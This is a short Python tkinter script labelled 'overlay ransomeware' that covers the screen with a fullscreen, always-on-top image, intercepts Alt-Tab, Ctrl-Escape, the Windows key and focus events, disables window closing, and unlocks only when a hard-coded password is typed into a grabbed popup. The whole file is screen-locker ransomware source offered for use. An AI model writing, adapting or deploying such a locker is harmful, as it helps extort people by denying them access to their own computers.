# overlay ransomeware
# created by calinux

import tkinter as tk
from PIL import Image, ImageTk

image_path = r"C:\path\to\your\image.png"

window = tk.Tk()
window.attributes('-fullscreen', True)

image = Image.open(image_path)

screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()
image = image.resize((screen_width, screen_height), Image.ANTIALIAS)

image_tk = ImageTk.PhotoImage(image)

image_label = tk.Label(window, image=image_tk)
image_label.pack()

def disable_events():
    return 'break'

window.attributes('-topmost', True)
window.bind('<FocusIn>', disable_events)
window.bind('<Alt-Tab>', disable_events)
window.bind('<Control-Escape>', disable_events)
window.bind('<Super_L>', disable_events)

def disable_close():
    pass

window.protocol("WM_DELETE_WINDOW", disable_close)

popup_window = tk.Toplevel(window)
popup_window.geometry("300x100")

popup_window.update_idletasks()
popup_width = popup_window.winfo_width()
popup_height = popup_window.winfo_height()
screen_x = (screen_width - popup_width) // 2
screen_y = (screen_height - popup_height) // 2
popup_window.geometry(f"+{screen_x}+{screen_y}")

password_label = tk.Label(popup_window, text="Enter password:")
password_label.pack()
password_entry = tk.Entry(popup_window, show="*")
password_entry.pack()

def check_password():
    password = password_entry.get()
    if password == "pass":
        window.destroy()
    else:
        password_entry.delete(0, tk.END)

submit_button = tk.Button(popup_window, text="Submit", command=check_password)
submit_button.pack()

popup_window.attributes('-topmost', True)
popup_window.protocol("WM_DELETE_WINDOW", disable_close)
popup_window.grab_set()

window.mainloop()
